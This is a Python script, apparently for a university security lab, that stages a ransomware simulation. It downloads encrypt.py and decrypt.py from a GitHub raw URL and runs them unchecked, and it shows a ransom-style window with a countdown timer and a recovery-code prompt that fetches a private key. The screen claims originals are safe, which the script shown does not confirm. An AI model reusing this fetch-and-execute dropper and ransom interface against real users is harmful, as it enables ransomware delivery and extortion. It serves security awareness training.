from pathlib import Path
from urllib.request import urlopen, Request
from datetime import datetime, timedelta
from PIL import Image, ImageTk
import subprocess
import sys
import time
import tkinter as tk

base = Path.home() / 'Desktop' / 'RansomDemo'
url = 'https://raw.githubusercontent.com/what0302/what0302.github.io/master/_posts/'
base.mkdir(parents=True, exist_ok=True)


def download(name, destination):
    request = Request(url + name + '?v=' + str(int(time.time())), headers={'User-Agent': 'UNT-Lab'})
    content = urlopen(request, timeout=12).read()
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_bytes(content)
    return destination


def execute(name):
    path = download(name, base / name)
    return subprocess.run([sys.executable, str(path)], capture_output=True, text=True)


try:
    result = execute('encrypt.py')
    print(result.stdout, result.stderr)
    ok = result.returncode == 0
    error_message = (result.stderr or result.stdout).strip().splitlines()[-1] if not ok else ''
except Exception as error:
    ok = False
    error_message = str(error)

root = tk.Tk()
root.title('UNT Security Lab')
root.configure(bg='#8b0000')
w = min(960, root.winfo_screenwidth() - 60)
h = min(650, root.winfo_screenheight() - 90)
root.geometry(f'{w}x{h}+{max(0, (root.winfo_screenwidth()-w)//2)}+{max(0, (root.winfo_screenheight()-h)//2)}')
root.minsize(550, 480)
root.bind('<Escape>', lambda event: root.destroy())
root.grid_columnconfigure(0, weight=1)
root.grid_rowconfigure(0, weight=1)

panel = tk.Frame(root, bg='#8b0000')
panel.grid(row=0, column=0, padx=18, pady=12)
small = w < 850

try:
    mascot_file = download('unt_mascot.png', base / '.runtime' / 'unt_mascot.png')
    image = Image.open(mascot_file).convert('RGBA')
    image.thumbnail((170 if small else 240, 250 if small else 360))
    mascot_photo = ImageTk.PhotoImage(image)
    photo_label = tk.Label(panel, image=mascot_photo, bg='#8b0000')
    photo_label.image = mascot_photo
    photo_label.grid(row=0, column=0, padx=(0, 14), sticky='n')
except Exception as error:
    print('Mascot unavailable:', error)

right = tk.Frame(panel, bg='#8b0000')
right.grid(row=0, column=1)


def label(message, size=13, color='white', gap=6):
    item = tk.Label(right, text=message, bg='#8b0000', fg=color, font=('Arial', size, 'bold'), wraplength=510 if not small else 310, justify='center')
    item.pack(pady=gap)
    return item


label('RANSOMWARE SIMULATION', 22 if small else 30)
label('ENCRYPTED COPIES CREATED' if ok else 'ENCRYPTION COPY FAILED', 13 if small else 18, '#ffe600')
label('THIS IS A TEST. ORIGINAL FILES ARE SAFE.', 10 if small else 12)
clock = tk.Label(right, text='00:30:00', bg='#171717', fg='#ffe600', font=('Courier', 27 if small else 43, 'bold'), padx=18, pady=10)
clock.pack(pady=10)
end = datetime.now() + timedelta(minutes=30)


def tick():
    left = max(0, int((end - datetime.now()).total_seconds()))
    clock.config(text=f'{left//3600:02}:{left//60%60:02}:{left%60:02}')
    if left:
        root.after(1000, tick)


tick()


def open_folder(name):
    folder = base / name
    if folder.is_dir():
        subprocess.Popen(['xdg-open', str(folder)])


tk.Button(right, text='VIEW ENCRYPTED COPIES', command=lambda:open_folder('encrypted_output')).pack(pady=8)
label('RECOVERY CODE', 12)
code_entry = tk.Entry(right, width=15, font=('Arial', 20), justify='center', show='*')
code_entry.pack(pady=3)
status = label('', 10, '#ffe600')


def recover():
    entered = code_entry.get().strip()
    if len(entered) != 4 or not entered.isdigit():
        status.config(text='ENTER A 4-DIGIT CODE')
        return
    try:
        remote_code = urlopen(Request(url+'recovery_code.txt?v='+str(int(time.time())), headers={'User-Agent':'UNT-Lab'}), timeout=10).read().decode().strip()
        if entered != remote_code:
            status.config(text='INVALID RECOVERY CODE')
            return
        status.config(text='DOWNLOADING RECOVERY FILES...')
        root.update_idletasks()
        download('recovery_private.pem', base / '.runtime' / 'recovery_private.pem')
        result = execute('decrypt.py')
        print(result.stdout, result.stderr)
        if result.returncode:
            status.config(text='RECOVERY FAILED - CHECK TERMINAL')
        else:
            status.config(text='RECOVERED COPIES VERIFIED')
            open_folder('recovered_output')
    except Exception as error:
        status.config(text='RECOVERY ERROR - CHECK TERMINAL')
        print(error)


button = tk.Button(right, text='RECOVER FILES', command=recover, padx=12, pady=6)
button.pack(pady=7)
code_entry.bind('<Return>', lambda event:recover())
if not ok:
    status.config(text='ERROR: ' + error_message[:90])
    button.config(state='disabled')
label('SIMULATION ONLY  •  ESC = Exit', 10, 'white', 5)
root.mainloop()
